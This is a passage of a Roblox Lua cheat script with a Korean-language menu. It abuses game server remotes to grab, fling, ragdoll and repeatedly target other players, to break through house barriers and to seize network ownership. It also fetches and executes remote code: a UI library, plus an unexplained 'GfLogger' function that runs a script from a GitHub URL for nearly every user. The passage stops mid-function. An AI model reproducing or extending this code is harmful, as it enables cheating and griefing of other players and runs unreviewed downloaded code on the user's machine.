


print("AP FTAP Script 시작 - 설정 저장 활성화")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

Players = game:GetService("Players")
plr = game.Players.LocalPlayer
cam = workspace.CurrentCamera
mouse = plr:GetMouse()
uis = game:GetService("UserInputService")
inv = workspace:WaitForChild(plr.Name.."SpawnedInToys")
rs = game:GetService("ReplicatedStorage")
RepStorage = game:GetService("ReplicatedStorage")
rs2 = game:GetService("RunService")
deb = game:GetService("Debris")

SetNetworkOwner = rs.GrabEvents.SetNetworkOwner
DestroyGrabLine = rs.GrabEvents.DestroyGrabLine

Auto = syn and syn.queue_on_teleport or fluxus and fluxus.queue_on_teleport or queue_on_teleport

Whitelist = {}
playersInLoop1V = {} -- List
playersInLoop2V = {} -- Loop

PPs = workspace:WaitForChild("PlotItems"):WaitForChild("PlayersInPlots")

----------------------------------------------------------------------------------------- [ 기본 설정 ]
function PcldOwner()
    task.spawn(function()
        while task.wait(0.1) do
            usedNames = {}

            for _, pcld in pairs(workspace:GetChildren()) do
                if pcld.Name == "PlayerCharacterLocationDetector" then
                    if pcld.CFrame == CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1) then
                        continue
                    end

                    hasOwner = false
                    existingBoolValues = {}

                    for _, child in pairs(pcld:GetChildren()) do
                        if child:IsA("BoolValue") then
                            table.insert(existingBoolValues, child)
                        end
                    end

                    if #existingBoolValues >= 2 then
                        for _, boolValue in pairs(existingBoolValues) do
                            boolValue:Destroy()
                        end
                    elseif #existingBoolValues == 1 then
                        hasOwner = true
                    end

                    if hasOwner then
                        continue
                    end

                    closestPlayer = nil
                    closestDist = 30
                    candidates = {}

                    for _, player in pairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            hrp = player.Character.HumanoidRootPart
                            dist = (pcld.Position - hrp.Position).Magnitude

                            if dist < closestDist then
                                table.insert(candidates, {
                                    player = player,
                                    dist = dist,
                                    hrp = hrp
                                })
                            end
                        end
                    end

                    table.sort(candidates, function(a, b)
                        return a.dist < b.dist
                    end)

                    for _, candidate in pairs(candidates) do
                        ownerName = string.format("[ %s ] ( @%s )",
                            candidate.player.DisplayName,
                            candidate.player.Name)

                        if not usedNames[ownerName] then
                            closestPlayer = candidate.player
                            closestDist = candidate.dist
                            usedNames[ownerName] = true
                            break
                        end
                    end

                    if closestPlayer then
                        ownerName = string.format("[ %s ] ( @%s )",
                            closestPlayer.DisplayName,
                            closestPlayer.Name)

                         boolValue = nil
                        for _, child in pairs(pcld:GetChildren()) do
                            if child:IsA("BoolValue") then
                                boolValue = child
                                boolValue.Name = ownerName
                                break
                            end
                        end

                        if not boolValue then
                            boolValue = Instance.new("BoolValue")
                            boolValue.Name = ownerName
                            boolValue.Parent = pcld
                        end

                        task.spawn(function(player, value)
                            while value.Parent do
                                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                     hrp = player.Character.HumanoidRootPart
                                    
                                    if hrp.Massless == true then
                                        if not value.Value then
                                            value.Value = true
                                        end
                                    else
                                        if value.Value then
                                            value.Value = false
                                        end
                                    end

                                    if not Players:FindFirstChild(player.Name) or 
                                       not player.Character or 
                                       player.Character:FindFirstChild("Humanoid") and 
                                       player.Character.Humanoid.Health <= 0 then
                                        value:Destroy()
                                        break
                                    end
                                else
                                    value:Destroy()
                                    break
                                end

                                task.wait(0.1)
                            end
                        end, closestPlayer, boolValue)
                    end
                end
            end
        end
    end)
end


function SpawnCFrame()
    local camPart
    myDisplayName = plr.DisplayName
    myUserName = plr.Name
    myPOIdentifier = string.format("[ %s ] ( @%s )", myDisplayName, myUserName)

    function findMyPO()
        for _, obj in pairs(workspace:GetChildren()) do
            if obj.Name == "PlayerCharacterLocationDetector" then
                for _, child in pairs(obj:GetChildren()) do
                    if child:IsA("BoolValue") and child.Name == myPOIdentifier then
                        return obj
                    end
                end
            end
        end
        return nil
    end

    if not workspace:FindFirstChild("CamPart") or workspace:FindFirstChild("CamPart"):FindFirstChild("CamPart") then
         char = plr.Character or plr.CharacterAdded:Wait()
        camPart = char:FindFirstChild("CamPart"):Clone()
        camPart.Name = "CamPart"
        camPart.Parent = workspace
        camPart.Transparency = 0.9
    else
        camPart = workspace.CamPart
    end

     lastHRPVelocity = Vector3.new(0, 0, 0)

    task.spawn(function()
         rayParams = RaycastParams.new()
        rayParams.FilterType = Enum.RaycastFilterType.Exclude

        while true do
             ping = plr:GetNetworkPing()
             myPO = findMyPO()
             char = plr.Character
             hrp = char and char:FindFirstChild("HumanoidRootPart")

            if hrp then
                lastHRPVelocity = hrp.Velocity
            end

            if myPO and hrp then
                rayParams.FilterDescendantsInstances = {char, camPart, myPO}

                 offset = myPO.Position + (lastHRPVelocity * (ping + 0.15))

                 rayOrigin = offset
                 rayDirection = Vector3.new(0, 23, 0)
                 rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)

                local targetPosition

                if rayResult then
                    targetPosition = rayResult.Position - Vector3.new(0, 0.5, 0)
                else
                    targetPosition = offset + rayDirection
                end

                 originalRotation = myPO.CFrame.Rotation * CFrame.Angles(math.rad(-90), 0, 0)
                camPart.CFrame = CFrame.new(targetPosition) * originalRotation

                rayParams.FilterDescendantsInstances = {char, camPart}

                 offset = hrp.Position + (lastHRPVelocity * (ping + 0.15))
                
                 rayOrigin = offset
                 rayDirection = Vector3.new(0, 20, 0)
                 rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)

                local targetPosition

                if rayResult then
                    targetPosition = rayResult.Position - Vector3.new(0, 0.5, 0)
                else
                    targetPosition = offset + rayDirection
                end

                 originalRotation = (hrp.CFrame * CFrame.Angles(math.rad(-90), 0, 0)).Rotation
                camPart.CFrame = CFrame.new(targetPosition) * originalRotation
                camPart.Name = "SpawnCF"
            end
            task.wait()
        end
    end)

    return camPart
end

G = rs.GrabEvents
G:WaitForChild("EndGrabEarly"):Destroy()
Instance.new("RemoteEvent", G).Name = "EndGrabEarly"

 local Rayfield =   loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local paca = {
    TextColor = Color3.fromRGB(255,255,255),
    LabelColor = Color3.fromRGB(0,220,100),

    Background = Color3.fromRGB(0,0,0),
    Topbar = Color3.fromRGB(8,8,8),
    Shadow = Color3.fromRGB(0,0,0),

    NotificationBackground = Color3.fromRGB(12,12,12),
    NotificationActionsBackground = Color3.fromRGB(25,25,25),

    TabBackground = Color3.fromRGB(15,10,22),
    TabStroke = Color3.fromRGB(45,25,70),
    TabBackgroundSelected = Color3.fromRGB(110,40,190),
    TabTextColor = Color3.fromRGB(150,150,150),
    SelectedTabTextColor = Color3.fromRGB(255,255,255),

    ElementBackground = Color3.fromRGB(10,10,10),
    ElementBackgroundHover = Color3.fromRGB(18,18,18),
    SecondaryElementBackground = Color3.fromRGB(5,5,5),
    ElementStroke = Color3.fromRGB(25,25,25),
    SecondaryElementStroke = Color3.fromRGB(18,18,18),

    SliderBackground = Color3.fromRGB(30,30,30),
    SliderProgress = Color3.fromRGB(255,255,255),
    SliderStroke = Color3.fromRGB(180,180,180),

    ToggleBackground = Color3.fromRGB(12,12,12),

    ToggleEnabled = Color3.fromRGB(220,0,0),
    ToggleEnabledStroke = Color3.fromRGB(255,80,80),
    ToggleEnabledOuterStroke = Color3.fromRGB(150,0,0),

    ToggleDisabled = Color3.fromRGB(40,40,40),
    ToggleDisabledStroke = Color3.fromRGB(60,60,60),
    ToggleDisabledOuterStroke = Color3.fromRGB(25,25,25),

    DropdownSelected = Color3.fromRGB(20,15,25),
    DropdownUnselected = Color3.fromRGB(12,12,12),

    InputBackground = Color3.fromRGB(15,15,8),
    InputStroke = Color3.fromRGB(220,180,0),
    PlaceholderColor = Color3.fromRGB(120,110,80),
}

local oldCreateToggle = Rayfield.CreateToggle
local oldCreateButton = Rayfield.CreateButton
local oldCreateLabel = Rayfield.CreateLabel
local oldCreateDropdown = Rayfield.CreateDropdown
local oldCreateSlider = Rayfield.CreateSlider
local oldCreateInput = Rayfield.CreateInput

-- 텍스트 내부에서 특정 단어를 찾아 그라데이션으로 쪼개주는 내부 함수
local function autoGradient(text, target, startColor, endColor)
    if not string.find(text, target, 1, true) then return text end
    
    local len = utf8.len(target)
    local result = ""
    local count = 0
    
    for _, code in utf8.codes(target) do
        local char = utf8.char(code)
        count = count + 1
        local ratio = (len > 1) and ((count - 1) / (len - 1)) or 0
        local r = math.floor(startColor.R * 255 + (endColor.R - startColor.R) * 255 * ratio)
        local g = math.floor(startColor.G * 255 + (endColor.G - startColor.G) * 255 * ratio)
        local b = math.floor(startColor.B * 255 + (endColor.B - startColor.B) * 255 * ratio)
        result = result .. string.format("<font color='rgb(%d,%d,%d)'>%s</font>", r, g, b, char)
    end
    
    return string.gsub(text, string.gsub(target, "([%(%)%.%%%+%-%*%?%[%]%^%$])", "%%%1"), result)
end

local function applyRichTextAndEffects(element)
    if not element then return end
    task.spawn(function()
        for _, v in pairs(element:GetDescendants()) do
            if v:IsA("TextLabel") then
                local currentText = v.Text
                
                -- 이미 작성되어 있던 특정 문구들을 자동으로 그라데이션 텍스트로 변환
                -- 예: [라인]을 주황->노랑 그라데이션으로 변경
                currentText = autoGradient(currentText, "[라인]", Color3.fromRGB(255, 100, 0), Color3.fromRGB(255, 255, 0))
                -- 예: [프리미엄]을 빨강->파랑 그라데이션으로 변경
                currentText = autoGradient(currentText, "[프리미엄]", Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 0, 255))
                
                v.Text = currentText
                v.RichText = true
                
                -- 글자 뒤에 은은하게 깔리는 검은색 안개(번짐) 효과
                v.TextStrokeTextColor3 = Color3.fromRGB(0, 0, 0)
                v.TextStrokeThickness = 2.5
                v.TextStrokeTransparency = 0.5
            end
        end
    end)
end

function Rayfield:CreateToggle(options)
    local element = oldCreateToggle(self, options)
    applyRichTextAndEffects(element)
    return element
end

function Rayfield:CreateButton(options)
    local element = oldCreateButton(self, options)
    applyRichTextAndEffects(element)
    return element
end

function Rayfield:CreateLabel(options)
    local element = oldCreateLabel(self, options)
    applyRichTextAndEffects(element)
    return element
end

function Rayfield:CreateDropdown(options)
    local element = oldCreateDropdown(self, options)
    applyRichTextAndEffects(element)
    return element
end

function Rayfield:CreateSlider(options)
    local element = oldCreateSlider(self, options)
    applyRichTextAndEffects(element)
    return element
end

function Rayfield:CreateInput(options)
    local element = oldCreateInput(self, options)
    applyRichTextAndEffects(element)
    return element
end


local Window = Rayfield:CreateWindow({
    Name = "파카허브 [프리미엄]",
    Icon = 0,
    Theme = paca,
    ToggleUIKeybind = "T",

    ConfigurationSaving = {
        Enabled = true,
        FolderName = "PacaHub",
        FileName = "Premium"
    }
})
local playerTab = Window:CreateTab("플레이어 설정", 6034281935)    
local passTab = Window:CreateTab("패스잠금해제")
local getTab = Window:CreateTab("알림",649498361)
local grabTab = Window:CreateTab("컴뱃", 6026568198)               
local UtilityTab = Window:CreateTab("유틸리티", 6031094678) 
local plotTab = Window:CreateTab("집")
local DDTab = Window:CreateTab("티배깅")
local FDTab = Window:CreateTab("친구 보호", 6026568198)        
local antiTab = Window:CreateTab("안전", 6034831332)               
local ListTab = Window:CreateTab("명단", 3572491301)              
local LoopTab = Window:CreateTab("조지기", 6023426923)             
local AuraTab = Window:CreateTab("아우라", 6031068423)   
local bdTab = Window:CreateTab("배경체인저")
local funTab = Window:CreateTab("찌끄레기", 4483345998)            
local keybindTab = Window:CreateTab("설정", 6031094678)            
local DevTab = Window:CreateTab("잡기능", 3944680095)             
local RankTab = Window:CreateTab("제작자 친구", 6034281935)       
local lagTab = Window:CreateTab("렉", 6023426923)   
local BTab = Window:CreateTab("블랙 리스트")
local CreditsTab = Window:CreateTab("제작자 한정")


----------------------------------------------------------------------------------------- [ 기능들 ]

function ForWhiteList(enable)
    WhiteListMode = enable

    task.spawn(function()
        while WhiteListMode do
            task.wait()
            for i, name in ipairs(Whitelist) do
            end
        end
    end)
end

function House()
    char = plr.Character
    if not char then
        Plot = nil
        return
    end

    if char.Parent and char.Parent.Name == "PlayersInPlots" then
        for _, plot in workspace.Plots:GetChildren() do
            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
                if owner.Value == plr.Name then
                    if plot.Name == "Plot1" then
                        Plot = 1
                    elseif plot.Name == "Plot2" then
                        Plot = 2
                    elseif plot.Name == "Plot3" then
                        Plot = 3
                    elseif plot.Name == "Plot4" then
                        Plot = 4
                    elseif plot.Name == "Plot5" then
                        Plot = 5
                    end
                    return
                end
            end
        end
        Plot = nil
        return
    end

    if char.Parent == workspace or char.Parent == inv then
        for _, plot in workspace.Plots:GetChildren() do
            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
                if owner.Value == plr.Name then
                    if plot.Name == "Plot1" then
                        Plot = 1
                    elseif plot.Name == "Plot2" then
                        Plot = 2
                    elseif plot.Name == "Plot3" then
                        Plot = 3
                    elseif plot.Name == "Plot4" then
                        Plot = 4
                    elseif plot.Name == "Plot5" then
                        Plot = 5
                    end
                    return
                end
            end
        end
        Plot = nil
    else
        Plot = nil
    end
end

function UpdateCurrentBlobman()
	char = plr.Character
	hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	for _, blobs in workspace:GetDescendants() do
		if blobs.Name ~= "CreatureBlobman" then continue end
		 seat = blobs:FindFirstChild("VehicleSeat")
		if not seat then continue end
		 weld = seat:FindFirstChild("SeatWeld")
		if not weld then continue end
		if weld.Part1 == hrp then
			currentBlobS = blobs
		end
	end
end

function BlobRelease(blob, target, side) -- 릴리스
     args = {
        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        [2] = target,
        }
        blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(unpack(args))
end

function BlobGrab(blob, target, side)
     args = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = target,
        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        }
        blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
end

function BlobDrop(blob, target, side)
     args = {
        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        [2] = target,
        }
        blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args))
end

function BlobMassless(blob, target, side)
     args = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = target,
        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        }

		 args2 = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = hrp,
        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        }

     args3 = {
        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        [2] = target,
        }

        blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args2))
		blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
		blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args3))
end

function GfLogger()
    id = {
        [1] = true,
    }
if not id[plr.UserId] then
        local success, errorMessage = pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))()
        end)

        if not success then
        end
    end
end
function flingF()
    workspace.ChildAdded:Connect(function(model)
        if model.Name == "GrabParts" then
             part_to_impulse = model["GrabPart"]["WeldConstraint"].Part1
            if part_to_impulse then
                model:GetPropertyChangedSignal("Parent"):Connect(function()
                    if not model.Parent and flingT then
                        local connection
                        connection = uis.InputBegan:Connect(function(inp, char)
                            if inp.UserInputType == Enum.UserInputType.MouseButton2 then
                                 velocityObj = Instance.new("BodyVelocity")
                                velocityObj.Parent = part_to_impulse
                                velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                velocityObj.Velocity = cam.CFrame.lookVector * strengthV
                                
                                wait(0.1)
                                velocityObj.Parent = workspace
                                velocityObj:Destroy()

                                connection:Disconnect()
                            end
                        end)
                    end
                end)
            end
        end
    end)
end

function infLineExtendF()
    uis.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseWheel then
            if lineDistanceV < 11 then
                lineDistanceV = 11
            end
    
            if input.Position.Z > 0 then
                lineDistanceV = lineDistanceV + increaseLineExtendV
            elseif input.Position.Z < 0 then
                lineDistanceV = lineDistanceV - increaseLineExtendV
            end
        end
    end)
    
    workspace.ChildAdded:Connect(function(child)
        if child.Name == "GrabParts" and child:IsA("Model") then
            if infLineExtendT and uis.MouseEnabled then
                 grabPartsModel = child

                grabPartsModel:WaitForChild("GrabPart")
                grabPartsModel:WaitForChild("DragPart")
                    
                 clonedDragPart = grabPartsModel.DragPart:Clone()
                clonedDragPart.Name = "DragPart1"
                clonedDragPart.AlignPosition.Attachment1 = clonedDragPart.DragAttach
                clonedDragPart.Parent = grabPartsModel
                
                lineDistanceV = (clonedDragPart.Position - cam.CFrame.Position).Magnitude
    
                clonedDragPart.AlignOrientation.Enabled = false
                grabPartsModel.DragPart.AlignPosition.Enabled = false

                if MasslessGrabT then
                     alignOrientation = clonedDragPart:FindFirstChildOfClass("AlignOrientation")
                    if alignOrientation then
                        alignOrientation.MaxAngularVelocity = math.huge
                        alignOrientation.MaxTorque = math.huge
                        alignOrientation.Responsiveness = 200
                    end
                    
                     alignPosition = clonedDragPart:FindFirstChildOfClass("AlignPosition")
                    if alignPosition then
                        alignPosition.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge)
                        alignPosition.MaxForce = math.huge
                        alignPosition.MaxVelocity = math.huge
                        alignPosition.Responsiveness = 200
                    end
                end
    
                task.spawn(function()
                    while grabPartsModel.Parent do
                        clonedDragPart.Position = cam.CFrame.Position + cam.CFrame.LookVector * lineDistanceV
                        task.wait()
                    end
            
                    lineDistanceV = 0
                end)
            end
        end
    end)
end

function BlobMasslessR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
         player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		BlobMassless(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end

function BlobReleaseR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
         player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		BlobGrab(currentBlobS, player.Character.HumanoidRootPart, "Right")
		BlobRelease(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end

function BlobGrabR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
         player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			BlobGrab(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end

function BlobDropR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
         player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			BlobDrop(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end


function updateWalkSpeedF()
     function apply(char)
         hum = char:WaitForChild("Humanoid")

        if walkSpeedT then
            hum.WalkSpeed = walkSpeedV
            hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                if walkSpeedT then
                    hum.WalkSpeed = walkSpeedV
                end
            end)
        else
            hum.WalkSpeed = 16
        end
    end

    if plr.Character then
        apply(plr.Character)
    end

    plr.CharacterAdded:Connect(apply)
end

function updateJumpPowerF()
     function apply(char)
         hum = char:WaitForChild("Humanoid")

        if jumpPowerT then
            hum.JumpPower = jumpPowerV
            hum:GetPropertyChangedSignal("JumpPower"):Connect(function()
                if jumpPowerT then
                    hum.JumpPower = jumpPowerV
                end
            end)
        else
            hum.JumpPower = 26
        end
    end

    if plr.Character then
        apply(plr.Character)
    end

    plr.CharacterAdded:Connect(apply)
end

 RunService = game:GetService("RunService")

 NO_CLIP_PARTS = {
    "Head",
    "Torso",
    "Left Arm", 
    "Left Leg",
    "Right Arm",
    "Right Leg"
}

function updateNoClipF()
     char = plr.Character
    if not char then return end

    if noClipConnection then
        noClipConnection:Disconnect()
        noClipConnection = nil
    end

    if not noClipT then
        restoreCollision(char)
        return
    end
    
     hrp = char:WaitForChild("HumanoidRootPart")
     hum = char:WaitForChild("Humanoid")

    noClipConnection = RunService.Stepped:Connect(function()
        if not noClipT or not char or not char.Parent then
            if noClipConnection then
                noClipConnection:Disconnect()
                noClipConnection = nil
            end
            return
        end

        for _, partName in ipairs(NO_CLIP_PARTS) do
             part = char:FindFirstChild(partName)
            if part and part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end)
end

function restoreCollision(char)
    if char then
        for _, partName in ipairs(NO_CLIP_PARTS) do
             part = char:FindFirstChild(partName)
            if part and part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

plr.CharacterAdded:Connect(function(char)
    char:WaitForChild("HumanoidRootPart")
    task.wait(0.5)
    
    if noClipT then
        updateNoClipF()
    end
end)

if plr.Character then
    task.wait(1)
    if noClipT then
        updateNoClipF()
    end
end



function masslessF()
    function applyMassless(char)
         hrp = char:WaitForChild("HumanoidRootPart")
         hum = char:WaitForChild("Humanoid")

        if masslessT then
            task.spawn(function()
                while masslessT and char.Parent do
                    for i, e in ipairs(char:GetChildren()) do
                        if e:IsA("BasePart") then
                            e.Massless = false
                        end
                    end
                    task.wait()
                end
            end)
        end
    end

    if plr.Character then
        applyMassless(plr.Character)
    end

    plr.CharacterAdded:Connect(function(char)
        task.wait(1)
        applyMassless(char)
    end)
end

function setRagdollF(state)
    char = plr.Character
    hrp = char:WaitForChild("HumanoidRootPart")
    if char and char:FindFirstChild("HumanoidRootPart") then
        rs.CharacterEvents.RagdollRemote:FireServer(hrp, state and 1 or 0)
    end
end

function permRagdollLoopF()
    if permRagdollRunningS then return end
    permRagdollRunningS = true
    while permRagdollT do
        setRagdollF(true)
        task.wait(0.001) 
    end
    permRagdollRunningS = false
    setRagdollF(false)
end


Pline = rs.GrabEvents.CreateGrabLine.OnClientEvent
fireCount = {}
function AntiLagF()
    Pline:Connect(function(fromPlr, ...)
        if not antiLagEnabled then return end
        if typeof(fromPlr) ~= "Instance" or not fromPlr:IsA("Player") then return end
        if fromPlr == plr then return end

        local now = os.clock()

        if not fireCount[fromPlr] then 
            fireCount[fromPlr] = {count = 0, start = now} 
        end

        local data = fireCount[fromPlr]

        if now - data.start > 1 then
            data.count = 0
            data.start = now
        end

        data.count += 1

        if data.count >= AntiLagV and not data.isDecreasing then
            data.isDecreasing = true
            Rayfield:Notify({Title = "[ ✏️ ]", Content = "by: " .. fromPlr.Name, Duration = 3, Image = 0})
            plr.PlayerScripts.CharacterAndBeamMove.Enabled = false

            task.spawn(function()
                while data.count > 0 do
                    task.wait(0.1)
                    data.count -= 1
                end

                plr.PlayerScripts.CharacterAndBeamMove.Enabled = true
                fireCount[fromPlr] = nil
            end)
        end
    end)
end


function spawnBlobmanF()
     char = plr.Character
     hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then
        return
    end

     blob = inv and inv:FindFirstChild("CreatureBlobman")
    if blob then
        blobmanInstanceS = blob
        return
    end

     spawnRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
    if spawnRemote then
        task.spawn(function()
        pcall(function()
            spawnRemote:InvokeServer("CreatureBlobman", hrp.CFrame, Vector3.new(0, 0, 0))
        end)
        end)

         tries = 0
        repeat
            task.wait(0.02)
            blobmanInstanceS = inv and inv:FindFirstChild("CreatureBlobman")
            tries += 1
        until blobmanInstanceS or tries > 25
    else
    end
end

function ragdollLoopF()
	if ragdollLoopD then return end
	ragdollLoopD = true

	while sitJumpT do
		char = plr.Character
		hrp = char and char:FindFirstChild("HumanoidRootPart")
		if char and hrp then
			 args = {[1] = hrp, [2] = 0}
			 remote = rs:FindFirstChild("CharacterEvents") and rs.CharacterEvents:FindFirstChild("RagdollRemote")
			if remote then
				remote:FireServer(unpack(args))
			end
		end
		task.wait()
	end

	ragdollLoopD = false
end

function sitJumpF()
    char = plr.Character
    hum = char and char:FindFirstChild("Humanoid")
    if not char or not hum then return end
    seat = blobmanInstanceS and blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
    if seat and seat.Occupant ~= hum then
    seat:Sit(hum)
    autoGucciT = false
    sitJumpT = false
end
end

function AutoGucciF()
    while AutoGucciT do
        local success = pcall(function()
            spawnBlobmanF()

             char = plr.Character
            if not char then
                task.wait(0.2)
                return 
            end

             hrp = char:WaitForChild("HumanoidRootPart")
             hum = char:WaitForChild("Humanoid")
             rag = hum:WaitForChild("Ragdolled")
             held = plr:WaitForChild("IsHeld")

             SpawnToyRemoteFunction = RepStorage.MenuToys.SpawnToyRemoteFunction 
             RagdollRemote = RepStorage.CharacterEvents.RagdollRemote
             DestroyToy = RepStorage.MenuToys.DestroyToy
             seat = blobmanInstanceS:WaitForChild("VehicleSeat"):WaitForChild("ProximityPrompt")

            if not hrp then return end
             OCF = hrp.CFrame

            if not sitJumpT then
                task.spawn(sitJumpF)
                sitJumpT = true
            end

            task.spawn(ragdollLoopF)
            task.wait(0.3)
            --fireproximityprompt(seat)
            --task.wait(0.2)
            --hrp.Massless = false
            --task.wait(0.15)
            hrp.CFrame = OCF

            successCheck = true
            sitJumpT = false
            RagdollRemote:FireServer(hrp, 0.001)

            while successCheck and AutoGucciT do
                if hum.Health <= 0 then
                    if blobmanInstanceS then
                        DestroyToy:FireServer(blobmanInstanceS)
                    end
                    successCheck = false
                    break
                end

                 seat = blobmanInstanceS and blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
                if seat.Occupant ~= nil then
                    DestroyToy:FireServer(blobmanInstanceS)
                    successCheck = false
                    break
                end

                if rag.Value == true or held.Value == true then
                    while (rag.Value == true or held.Value == true) and AutoGucciT do
                        rs.CharacterEvents.Struggle:FireServer()
                        task.wait()
                    end
                    successCheck = false
                    break
                end

                 blobHRP = blobmanInstanceS and blobmanInstanceS:FindFirstChild("HumanoidRootPart")
                if blobHRP then
                     SetNetworkOwner = rs:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
                    pcall(function()
                        SetNetworkOwner:FireServer(blobHRP, hrp)
                    end)
                    blobHRP.CFrame = CFrame.new(0, 999999, 0)
                end

                task.wait()
            end

            if not successCheck then
                 blobHRP = blobmanInstanceS and blobmanInstanceS:FindFirstChild("HumanoidRootPart")
                Rayfield:Notify({Title = "[ 🔓 ]",Content = "구찌실패 | 기다려 씨발",Duration = 1,Image = nil,})
                if hum then
                    rs.CharacterEvents.Struggle:FireServer(plr)
                    hum.Sit = true
                    task.wait(0.1)
                    hum.Sit = false
                    if blobHRP.Position.Y > 9000 then  DestroyToy:FireServer(blobmanInstanceS) end
                end

                sitJumpT = false
                task.wait(1)
            end
        end)
    task.wait()
    end
end

function sitJumpFV2()
     char = plr.Character
     hum = char and char:FindFirstChild("Humanoid")
    if not char or not hum then return end

     seat = workspace.Map.AlwaysHereTweenedObjects.Train.Object.ObjectModel.Seat
    if seat and seat.Occupant ~= hum then
    seat:Sit(hum)
    AutoGucciTV2 = false
    sitJumpT = false
end
end

function AutoGucciFV2()
     char = plr.Character
    if not char then
        task.wait(1)
        return 
    end

     hrp = char:WaitForChild("HumanoidRootPart")
     hum = char:WaitForChild("Humanoid")

    if not hrp then return end
     OCF = hrp.CFrame

    if not sitJumpT then
        task.spawn(sitJumpFV2)
        sitJumpT = true
    end
    task.spawn(ragdollLoopF)
    task.wait(0.3)
    hrp.CFrame = OCF
    sitJumpT = false
end


 plotItemsFolder = workspace:WaitForChild("PlotItems")
 playersInPlotsFolder = plotItemsFolder:WaitForChild("PlayersInPlots")

 function antiInPlotsLoop()
    while antiInPlotsEnabled do
        for _, player in pairs(game.Players:GetPlayers()) do
            if player == plr then
                continue
            end

             char = player.Character
            if char and char.Parent then
                 inPlot = playersInPlotsFolder:FindFirstChild(player.Name)

                if inPlot then
                    if char.Parent ~= inv then
                        char.Parent = inv
                    end
                else
                    if char:IsDescendantOf(plotItemsFolder) then
                    end
                end
            end
        end
        task.wait()
    end
end
-- ================== Break House Barrier (하우스 베리어 뚫기) ==================
local BreakHouseBarrierT = false

function BreakHouseBarrierF()
    if not BreakHouseBarrierT then 
        return 
    end

    task.spawn(function()
        while BreakHouseBarrierT do
            for _, plot in ipairs(workspace.Plots:GetChildren()) do
                for _, part in ipairs(plot:GetDescendants()) do
                    if part:IsA("BasePart") and (part.Name:find("Barrier") or part.Name:find("Wall") or part.Transparency < 1) then
                        pcall(function()
                            part.CanCollide = false
                            part.Transparency = 0.7  
                        end)
                    end
                end
            end

            local grabParts = workspace:FindFirstChild("GrabParts")
            if grabParts then
                for _, part in ipairs(grabParts:GetDescendants()) do
                    if part:IsA("BasePart") then
                        pcall(function()
                            rs.GrabEvents.SetNetworkOwner:FireServer(part, part.CFrame)
                        end)
                    end
                end
            end

            task.wait(0.1)
        end
    end)
end

function BlobSit()
    if BLOBSIT then return end

     char = plr.Character
    if not char then return end

     humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    if humanoid.SeatPart ~= nil then return end

    BLOBSIT = true

    myInv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
    myBlob = myInv and myInv:FindFirstChild("CreatureBlobman")

    if myBlob then
         seat = myBlob:FindFirstChildOfClass("VehicleSeat")
        if seat then
            if seat.Occupant == nil then
                seat:Sit(humanoid)
                BLOBSIT = false
                return
            else
                 targetPlr = game.Players:GetPlayerFromCharacter(seat.Occupant.Parent)
                if targetPlr then
                    TP(targetPlr)
                    task.wait(0.3)
                    SetOwner(targetPlr)
                    task.wait(0.05)
                    seat:Sit(humanoid)
                    BLOBSIT = false
                    return
                end
            end
